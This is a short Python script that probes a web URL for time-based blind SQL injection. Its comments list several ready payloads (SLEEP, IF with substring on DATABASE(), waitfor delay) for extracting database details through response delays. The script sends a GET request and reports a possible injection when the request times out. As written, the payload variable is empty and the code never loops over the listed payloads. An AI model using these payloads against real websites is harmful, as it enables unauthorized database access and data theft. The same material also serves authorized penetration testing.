#!/usr/bin/python
import requests

#  Common payloads
#  +AND+SLEEP(10)--
#  /**/AND/**/SLEEP(10)/**/--
#  '+AND+(IF((substring((SELECT+DATABASE()),1,1))+=+'d',+SLEEP(5),+0))--+
#  /**/AND/**/(IF((substring((SELECT/**/DATABASE()),1,1))/**/=/**/'a',/**/SLEEP(0.5),/**/0))/**/--
#  '+(select*from(select(sleep(10)))a)+'
#  '+AND+(SELECT+9950+FROM+(SELECT(SLEEP(10)))obCp)--+
#  '; waitfor delay '0:0:3' --

payload = ""
url = "https://example.com/test.php?id=5%s" % payload

try:
    response = requests.get(url, timeout=10)  # 10 seconds
except requests.exceptions.Timeout:
    print("Posible Sql Injection")
    exit()
